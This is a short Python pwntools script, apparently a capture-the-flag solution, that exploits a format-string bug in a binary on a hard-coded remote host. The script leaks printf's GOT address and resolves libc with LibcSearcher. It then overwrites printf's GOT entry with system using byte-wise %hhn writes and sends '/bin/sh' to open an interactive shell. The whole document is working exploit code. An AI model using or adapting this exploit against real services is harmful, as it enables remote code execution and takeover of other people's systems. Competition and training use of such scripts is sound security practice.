from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = "debug"

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

fpath = "./pwn"
context.log_level = "debug"
# p = process(fpath)
p = remote("106.75.126.184" , 58579 )
elf = ELF(fpath)

#get_offset
payload = "AAAA"+ "%p" * 10
p.recv()
p.sendline(payload)
text = p.recv()
offset = len(text.split("0x41414141")[0].split("0x")) 

# get_addr_printf_got
addr_printf_got = elf.got["printf"]
payload = p32(addr_printf_got) + "%" + str(offset) + "$s"
p.sendline(payload)
# print p.recvuntil("\x0a")
p.recv(4)
temp = p.recv(4)
addr_printf = u32(p.recv(4))
p.recv()
# get system_addr
print "printf : 0x%x" % addr_printf
libc = LibcSearcher("printf" , addr_printf)
offset_printf = libc.dump("printf")
offset_system = libc.dump("system")
system_addr = addr_printf - offset_printf + offset_system

print "system : 0x%x" % system_addr
# overwrite print
payload = fmt_str(offset , 4 , addr_printf_got , system_addr)
p.sendline(payload)
p.recv()
p.sendline("/bin/sh\x00")
p.interactive()




